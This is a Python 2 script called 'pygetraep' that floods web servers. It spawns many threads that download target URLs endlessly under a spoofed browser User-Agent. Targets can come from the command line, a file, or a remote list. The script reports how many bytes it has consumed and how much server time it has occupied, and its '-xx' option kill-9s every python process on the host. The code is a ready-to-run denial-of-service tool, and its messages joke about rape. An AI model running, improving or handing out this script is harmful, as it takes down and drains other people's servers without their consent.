#!/usr/bin/env python
def versionstr():
        return "Linux/Unix/Mac pygetraep 1.2"

import sys,os,urllib2,re,string,thread,signal,glob,time
from threading import Thread
from random import randint

def protocolcheck(str):
        url = str
        p = re.compile('://')
        if(p.search(url)==None):
                return "http://" + url
        else:
                return url

class loop(Thread):
        def __init__ (self,url,filesize,lid,silent):
                Thread.__init__(self)
                self.url = protocolcheck(url)
                self.filesize = float(filesize)
                self.rate=0
                self.lid = lid
                self.silent = silent
        def run(self):
                while os.path.exists(gofile):
                        if(not os.path.exists(pausefile)):
                                try:
                                        request = urllib2.Request(self.url)
                                        request.add_header('User-Agent','Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9')
                                        opener = urllib2.build_opener()
                                        res2 = opener.open(request)
                                        t1 = time.time()
                                        foo = res2.read()
                                        t2 = time.time()
                                        dat1 = res2.info()
                                        dat2 = dat1.getheader("Content-Length")
                                        if(not isnumber(dat2)):
                                                damage.addraep(self.filesize)
                                        else:
                                                damage.addraep(dat2);
                                                self.filesize=float(dat2)
                                        timeraep.addraep(t2-t1)
                                        globallock.acquire()
                                        rite = open(statfile,"w")
                                        rite.write(str(damage.getraep()))
                                        rite.close()
                                        globallock.release()
                                        foo =""

                                        self.rate = str(int(self.filesize)/(t2-t1)/1024)
                                        speedlock.acquire()
                                        speeddict[self.lid] = self.rate
                                        if(not self.silent and not os.path.exists(pausedfile)):
                                                os.system("clear")
                                                print versionstr()
                                                totalrate = 0
                                                for klid, vrate in speeddict.iteritems():
                                                        totalrate = totalrate + float(vrate)
                                                print "Raeping at %.3f KB/s" % totalrate
                                                print "Raeped " + raepmsg() + " so far"
                                                print "Occupied %.3f seconds of the server's time" % timeraep.getraep()
                                        speedlock.release()
                                except (TypeError,ValueError):
                                        True
                                except:
                                        print "Cannot access " + self.url + "!"
                                        print sys.exc_info()[1]
                        else:
                                if(not os.path.exists(pausedfile)):
                                        pf = open(pausedfile,"w")
                                        pf.close()
                                        os.system("clear")
                                        print "Paused..."
                                time.sleep(2)
                                #print self.lid + " sleeping"

                if(os.path.exists(dorepfile)):
                        report = open(reportfile,"w")
                        report.write(closemsg())
                        report.close()
                        os.remove(dorepfile)
                        drf = open(donerepfile,"w")
                        drf.close()

                os.system("kill "+str(os.getpid()))

        def rawrate(self):
                return str(self.rate)
        def getlid(self):
                return self.lid


class spawn(Thread):
        def __init__(self, url, times,silent,uid,siid):
                Thread.__init__(self)
                self.url = protocolcheck(url)
                self.times = times
                self.filesize=-1
                self.silent = silent
                sid = uid + "."+str(siid)
                self.sid = sid
        def run(self):
                self.filesize=-1
                res = urllib2.urlopen(self.url)
                dat1 = res.info()
                dat2 = dat1.getheader("Content-Length")
                if(isnumber(dat2) or dat2==0):
                        True
                else:
                        try:
                                randfile = "temp"+str(self.sid)+".pyget"
                                handle = open(randfile,"w")
                                handle.write(res.read())
                                self.filesize=os.stat(randfile)[6]
                                handle.close()
                                os.remove(randfile)
                        except:
                                print "Couldn't verify filesize for " + self.url + "; bandwidth count will be wrong."
                for i in range(0, int(self.times)):
                        dex = i + 1
                        if(not self.silent):
                                print "Starting #" + `dex` + " on " + self.url.rstrip()
                        lid = str(self.sid) + "." + str(i)
                        current = loop(self.url,self.filesize,lid,self.silent)
                        speedlock.acquire()
                        speeddict[lid]=0
                        speedlock.release()
                        current.start()

def isnumber(testme):
        try:
                t = int(testme)
                return True
        except (ValueError,TypeError):
                try:
                        u = float(testme)
                        return True
                except (ValueError,TypeError):
                        return False
        return False

class raepcounter:
        def __init__(self):
                self.count=0
        def addraep(self,raeped):
                if(isnumber(raeped)):
                        self.count+=float(raeped)
        def getraep(self):
                return self.count

def raepmsg():
        if(os.path.exists(statfile)):
                globallock.acquire()
                num=float(open(statfile,"r").read())
                globallock.release()
                if(num<1024):
                        return str(num) + " bytes"
                elif(num<1048576):
                        return "%.3f kilobytes" % (num/1024.0)
                elif(num<1073741824):
                        return "%.3f megabytes" % (num/1048576.0)
                else:
                        return "%.3f gigabytes" % (num/1073741824.0)

def raeport(num):
        num = int(num)
        if(num<1024):
                return str(num) + " bytes"
        elif(num<1048576):
                return "%.3f kilobytes" % (num/1024.0)
        elif(num<1073741824):
                return "%.3f megabytes" % (num/1048576.0)
        else:
                return "%.3f gigabytes" % (num/1073741824.0)

def cleanup():
        if(os.path.exists(gofile)):
                os.remove(gofile)
        if(os.path.exists(pausedfile)):
                os.remove(pausedfile)

def bigclean():
        os.system("rm *.pyget")

def closemsg():
        totalrate = 0
        speedlock.acquire()
        for klid, vrate in speeddict.iteritems():
                totalrate = totalrate + float(vrate)
        speedlock.release()
        foo = ""
        foo = "Raeped at %.3f KB/s\n" % totalrate
        foo += "Raeped " + raepmsg() + " total\n"
        foo += "Occupied %.3f seconds of the server's time\n" % timeraep.getraep()
        return foo


damage = raepcounter()
timeraep = raepcounter()
globallock = thread.allocate_lock()
speedlock = thread.allocate_lock()
speedlist = ["a"]
speedlist.remove("a")
speeddict={1:"foo"}
del speeddict[1]
uniqueid=str(randint(100,1000000000000))
gofile="go"+uniqueid+".pyget"
statfile = "stat"+uniqueid+".pyget"
reportfile = "report"+uniqueid+".pyget"
dorepfile = "doreport.pyget"
donerepfile = "donereport.pyget"
pausefile = "pause.pyget"
pausedfile = "paused.pyget"

if(len(sys.argv)<=1):
        turl = raw_input("Enter target: ")
        times = raw_input("How many loops should I direct there? ")
        go = open(gofile,"w")
        spiggle = spawn(turl,times,False,uniqueid,0)
        print "This window will be busy until you call 'pygetraep --stop'"
        spiggle.start()
        go.close()
elif(sys.argv[1]=="--help" or sys.argv[1]=="-h" or len(sys.argv)==1):
        print versionstr()
        print ""
        print "Usage:  pygetraep [url [number | [url [url [url ... ]]] [-q]] ]"
        print "        pygetraep -f|--file filename [number [-q]]"
        print "        pygetraep -w|--web url [number [-q]]"
        print "        pygetraep -x|--stop|-xx"
        print ""
        print "pygetraep google.com 10"
        print "-Will start 10 loops repeatedly downloading google.com"
        print ""
        print "pygetraep google.com altavista.com ask.com"
        print "-Will ask for a number of loops to start repeatedly downloading from each url"
        print ""
        print "pygetraep --file targets.txt 10"
        print "-Will start 10 loops repeatedly downloading each line in targets.txt"
        print ""
        print "pygetraep -w google.com/targets.txt"
        print "-Will start 10 loops repeatedly downloading each line in google.com/targets.txt"
        print ""
        print "pygetraep -x will tell all loops to kill themselves. -xx will kill all loops."
        print "other switches: -s|--stat -p|--pause -q|--quiet"
elif(sys.argv[1]=="--web" or sys.argv[1]=="-w"):
        cleanup()
        tfile = urllib2.urlopen(protocolcheck(sys.argv[2])).read()
        tlist = tfile.split("\n")
        times = 0
        besilent = False
        if(len(sys.argv)>=4):
                times = sys.argv[3]
                if(len(sys.argv)==5 and (sys.argv[4]=="-q" or sys.argv[4]=="--quiet")):
                        besilent=True
        else:
                times = raw_input("How many loops should I direct there? ")
        go = open(gofile,"w")
        print "This window will be busy until you call 'pygetraep --stop'"
        count=0
        for line in tlist:
                mother = spawn(line, times,besilent,uniqueid,count)
                count = count+1
                mother.start()
        go.close()
elif(sys.argv[1]=="--file" or sys.argv[1]=="-f"):
        cleanup()
        times = 0
        besilent = False
        if(len(sys.argv)>=4):
                times = sys.argv[3]
                if(len(sys.argv)==5 and (sys.argv[4]=="-q" or sys.argv[4]=="--quiet")):
                        besilent=True
        else:
                times = raw_input("How many loops should I direct there? ")
        tfile = open(sys.argv[2],"r")
        tlist = tfile.readlines()
        go = open(gofile,"w")
        print "This window will be busy until you call 'pygetraep --stop'"
        count=0
        for line in tlist:
                mother = spawn(line, times,besilent,uniqueid,count)
                count = count +1
                mother.start()
        go.close()
elif(sys.argv[1]=="-p" or sys.argv[1]=="--pause"):
        if(os.path.exists(pausefile)):
                os.remove(pausefile)
                if(os.path.exists(pausedfile)):
                        os.remove(pausedfile)
        else:
                p = open(pausefile,"w")
                p.close()
elif(sys.argv[1]=="--xtra"):
        print "This doesn't actually use pyget"
elif(sys.argv[1]=="-x" or sys.argv[1]=="--stop"):
        os.system("clear")
        drf = open(dorepfile,"w")
        print "Stopping..."
        os.system("rm go*.pyget")
        seconds = 0
        while(not os.path.exists(donerepfile) and seconds <10):
                time.sleep(.5)
                seconds +=.5
        os.system("cat report*.pyget")
        bigclean()
elif(sys.argv[1]=="-xx"):
        os.system("clear")
        drf = open(dorepfile,"w")
        print "Terminating!"
        try:
                os.system("rm go*.pyget")
        except:
                1+1
        seconds =0
        while(not os.path.exists(donerepfile) and seconds <10):
                time.sleep(.5)
                seconds+=.5
        try:
                os.system("cat report*.pyget")
        except:
                print "No reports found"
        pids = os.popen("ps -ax | grep python | grep -v 'grep'").readlines()
        for pid in pids:
                tpid = pid.lstrip().rstrip().split(" ")[0]
                os.system("kill -9 " + tpid)
        bigclean()
elif(sys.argv[1]=="-s" or sys.argv[1]=="--stat"):
        print "not implemented"
        print "If you know how to fix a 'bad file descriptor' error in python"
        print "when calling os.popen('cat stat*.pyget'), please get on #insurgency"
        print "and say so, so that this can be fixed"
elif(len(sys.argv)==2):
        cleanup()
        times = raw_input("How many loops should I direct there? ")
        go = open(gofile,"w")
        spiggle = spawn(sys.argv[1],times,False,uniqueid,0)
        print "This window will be busy until you call 'pygetraep --stop'"
        spiggle.start()
        go.close()
else:
        cleanup()
        if(isnumber(sys.argv[2])):
                turl = sys.argv[1]
                times = sys.argv[2]
                besilent =False
                if(len(sys.argv)==4 and (sys.argv[3]=="-q" or sys.argv[3]=="--quiet")):
                        besilent=True
                go = open(gofile,"w")
                print "This window will be busy until you call 'pygetraep --stopf'"
                mother = spawn(turl, times,besilent,uniqueid,0)
                mother.start()
                go.close()
        else:
                times = raw_input("How many loops should I direct there? ")
                targs = sys.argv
                besilent = False
                if(targs[-1]=="-q" or targs[-1]=="--quiet"):
                        targs.remove(targs[-1])
                        besilent=True
                targs.remove(targs[0])
                go = open(gofile,"w")
                print "This window will be busy until you call 'pygetraep --stop'"
                count=0
                for url in targs:
                        mother = spawn(url,times,besilent,uniqueid,count)
                        count = count + 1
                        mother.start()
                go.close()
